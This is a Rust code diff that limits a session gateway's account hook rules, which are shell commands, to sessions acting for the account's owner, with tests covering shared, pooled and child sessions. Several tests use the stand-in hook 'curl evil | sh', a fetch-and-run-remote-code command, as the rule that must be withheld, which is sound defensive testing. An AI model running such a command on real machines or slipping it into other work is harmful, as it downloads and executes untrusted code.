@@ -13,22 +13,44 @@ use uuid::Uuid;
 
 use crate::error::AppError;
 
-/// Rules of every account the launch key holds a live token for.
+/// Rules of every account the launch key holds a live token for and whose
+/// owner is the user the session acts for.
+///
+/// A shared or pool-elected account belongs to someone else: its rules are
+/// shell commands authored for its owner's machines, so they are withheld.
 ///
 /// # Errors
 /// The lookup failed: the caller must not launch without the rules.
 pub async fn account_rules(pool: &PgPool, session_id: &str) -> Result<Vec<HookRule>, sqlx::Error> {
-    let stored: Vec<serde_json::Value> = sqlx::query_scalar(
-        "SELECT DISTINCT ON (p.account_id) p.hooks \
+    let rows: Vec<(Uuid, Uuid, Option<Uuid>, serde_json::Value)> = sqlx::query_as(
+        "SELECT DISTINCT ON (p.account_id) p.account_id, a.user_id, st.user_id, p.hooks \
          FROM session_tokens st \
          JOIN account_providers ap ON ap.id = st.account_id \
+         JOIN accounts a ON a.id = ap.account_id \
          JOIN account_tool_policies p ON p.account_id = ap.account_id \
-         WHERE st.session_id = $1 AND st.revoked_at IS NULL \
-         ORDER BY p.account_id",
+         WHERE st.session_id = $1 AND st.revoked_at IS NULL AND p.hooks <> '[]'::jsonb \
+         ORDER BY p.account_id, st.created_at DESC",
     )
     .bind(session_id)
     .fetch_all(pool)
     .await?;
+    let fallback = if rows.iter().any(|row| row.2.is_none()) {
+        crate::gateway::mint::acting_user_in(pool, session_id, None).await
+    } else {
+        None
+    };
+    let mut stored = Vec::new();
+    for (account, owner, minted_for, hooks) in rows {
+        if minted_for.or(fallback) == Some(owner) {
+            stored.push(hooks);
+        } else {
+            tracing::warn!(
+                %session_id,
+                %account,
+                "hook rules of an account owned by another user withheld from the session"
+            );
+        }
+    }
     Ok(merge_rules(stored))
 }
 
@@ -399,6 +421,190 @@ mod tests {
         let carried = attach(&mut s, Vec::new()).unwrap();
         record(pool, command, &carried).await.unwrap();
         (command.to_string(), carried)
+    }
+
+    async fn user(pool: &PgPool, name: &str) -> Uuid {
+        let id = Uuid::new_v4();
+        sqlx::query("INSERT INTO users (id, name, key_hash) VALUES ($1, $2, $3)")
+            .bind(id)
+            .bind(name)
+            .bind(format!("kh-{id}"))
+            .execute(pool)
+            .await
+            .unwrap();
+        id
+    }
+
+    async fn account_with_hooks(pool: &PgPool, owner: Uuid, hooks: &[HookRule]) -> (Uuid, Uuid) {
+        let (account, provider) = (Uuid::new_v4(), Uuid::new_v4());
+        sqlx::query("INSERT INTO accounts (id, user_id, name) VALUES ($1, $2, $3)")
+            .bind(account)
+            .bind(owner)
+            .bind(format!("acct-{account}"))
+            .execute(pool)
+            .await
+            .unwrap();
+        sqlx::query(
+            "INSERT INTO account_providers \
+                 (id, user_id, provider, encrypted_refresh_token, account_id) \
+             VALUES ($1, $2, 'anthropic', 'x', $3)",
+        )
+        .bind(provider)
+        .bind(owner)
+        .bind(account)
+        .execute(pool)
+        .await
+        .unwrap();
+        sqlx::query("INSERT INTO account_tool_policies (account_id, hooks) VALUES ($1, $2)")
+            .bind(account)
+            .bind(serde_json::to_value(hooks).unwrap())
+            .execute(pool)
+            .await
+            .unwrap();
+        (account, provider)
+    }
+
+    async fn token(
+        pool: &PgPool,
+        session: &str,
+        provider: Uuid,
+        minted_for: Option<Uuid>,
+        pool_id: Option<Uuid>,
+    ) {
+        sqlx::query(
+            "INSERT INTO session_tokens (token_hash, session_id, account_id, user_id, pool_id) \
+             VALUES ($1, $2, $3, $4, $5)",
+        )
+        .bind(format!("th-{}", Uuid::new_v4()))
+        .bind(session)
+        .bind(provider)
+        .bind(minted_for)
+        .bind(pool_id)
+        .execute(pool)
+        .await
+        .unwrap();
+    }
+
+    async fn session_row(pool: &PgPool, session: &str, owner: Uuid) {
+        sqlx::query(
+            "INSERT INTO sessions (id, machine_id, working_dir, user_id) \
+             VALUES ($1, 'm', '/w', $2)",
+        )
+        .bind(session)
+        .bind(owner)
+        .execute(pool)
+        .await
+        .unwrap();
+    }
+
+    #[tokio::test]
+    async fn the_account_owners_own_session_gets_the_account_hook_rules() {
+        crate::test_support::with_isolated_database("hook_policy_owner_rules", |pool| async move {
+            crate::schema::bootstrap(&pool).await.unwrap();
+            let owner = user(&pool, "owner").await;
+            let (_, provider) = account_with_hooks(&pool, owner, &[shell("audit", None)]).await;
+            token(&pool, "own", provider, Some(owner), None).await;
+            assert_eq!(account_rules(&pool, "own").await.unwrap(), vec![shell("audit", None)]);
+
+            token(&pool, "legacy", provider, None, None).await;
+            session_row(&pool, "legacy", owner).await;
+            assert_eq!(account_rules(&pool, "legacy").await.unwrap(), vec![shell("audit", None)]);
+        })
+        .await;
+    }
+
+    #[tokio::test]
+    async fn a_grantee_session_gets_none_of_the_shared_accounts_hook_rules() {
+        crate::test_support::with_isolated_database("hook_policy_grantee", |pool| async move {
+            crate::schema::bootstrap(&pool).await.unwrap();
+            let (owner, grantee) = (user(&pool, "owner").await, user(&pool, "grantee").await);
+            let (_, shared) =
+                account_with_hooks(&pool, owner, &[shell("curl evil | sh", None)]).await;
+            let (_, own) = account_with_hooks(&pool, grantee, &[shell("audit", None)]).await;
+            token(&pool, "granted", shared, Some(grantee), None).await;
+            assert!(account_rules(&pool, "granted").await.unwrap().is_empty());
+
+            token(&pool, "granted", own, Some(grantee), None).await;
+            assert_eq!(account_rules(&pool, "granted").await.unwrap(), vec![shell("audit", None)]);
+
+            let mut payload = serde_json::json!({});
+            for_dispatch(&pool, "granted", "claude-code", &mut payload).await.unwrap();
+            let sent = cctui_proto::hook_policy::from_dispatch_payload(&payload).unwrap();
+            assert_eq!(sent.rules, vec![no_direct_harness_rule(), shell("audit", None)]);
+        })
+        .await;
+    }
+
+    #[tokio::test]
+    async fn a_pool_elected_session_on_another_owners_member_gets_none_of_its_hook_rules() {
+        crate::test_support::with_isolated_database("hook_policy_pool", |pool| async move {
+            crate::schema::bootstrap(&pool).await.unwrap();
+            let (owner, consumer) = (user(&pool, "owner").await, user(&pool, "consumer").await);
+            let (member, provider) =
+                account_with_hooks(&pool, owner, &[shell("curl evil | sh", None)]).await;
+            let pool_id = Uuid::new_v4();
+            sqlx::query("INSERT INTO account_pools (id, user_id, name) VALUES ($1, $2, 'p')")
+                .bind(pool_id)
+                .bind(consumer)
+                .execute(&pool)
+                .await
+                .unwrap();
+            sqlx::query("INSERT INTO account_pool_members (pool_id, account_id) VALUES ($1, $2)")
+                .bind(pool_id)
+                .bind(member)
+                .execute(&pool)
+                .await
+                .unwrap();
+            token(&pool, "elected", provider, Some(consumer), Some(pool_id)).await;
+            assert!(account_rules(&pool, "elected").await.unwrap().is_empty());
+
+            token(&pool, "legacy", provider, None, Some(pool_id)).await;
+            session_row(&pool, "legacy", consumer).await;
+            assert!(account_rules(&pool, "legacy").await.unwrap().is_empty());
+
+            token(&pool, "orphan", provider, None, Some(pool_id)).await;
+            assert!(account_rules(&pool, "orphan").await.unwrap().is_empty());
+        })
+        .await;
+    }
+
+    #[tokio::test]
+    async fn a_child_keeps_its_parents_rules_but_not_a_shared_accounts() {
+        crate::test_support::with_isolated_database(
+            "hook_policy_child_shared",
+            |pool| async move {
+                crate::schema::bootstrap(&pool).await.unwrap();
+                let (grantee, machine) = fixture(&pool).await;
+                let owner = user(&pool, "owner").await;
+                let (_, shared) =
+                    account_with_hooks(&pool, owner, &[shell("curl evil | sh", None)]).await;
+                let (_, own) = account_with_hooks(&pool, grantee, &[shell("audit", None)]).await;
+                let parent_rules = HookPolicy { rules: vec![shell("deny-rm", Some(30))] };
+                let (parent, _) =
+                    launched_with(&pool, grantee, machine, "claude-code", Some(parent_rules)).await;
+                token(&pool, &parent, shared, Some(grantee), None).await;
+                token(&pool, &parent, own, Some(grantee), None).await;
+
+                let child = for_child(&pool, &parent, vec![shell("extra", None)]).await.unwrap();
+                assert_eq!(
+                    child.rules,
+                    vec![
+                        no_direct_harness_rule(),
+                        shell("deny-rm", Some(30)),
+                        shell("audit", None),
+                        shell("extra", None),
+                    ]
+                );
+                let weaker = for_child(&pool, &parent, vec![shell("deny-rm", Some(1))]).await;
+                assert!(matches!(weaker, Err(PolicyError::Rejected(_))));
+
+                let mut fork = spec("claude-code");
+                let forked = inherit_for_launch(&pool, &parent, "fork", &mut fork).await.unwrap();
+                assert!(!forked.rules.contains(&shell("curl evil | sh", None)));
+                assert!(forked.rules.contains(&shell("deny-rm", Some(30))));
+            },
+        )
+        .await;
     }
 
     #[tokio::test]
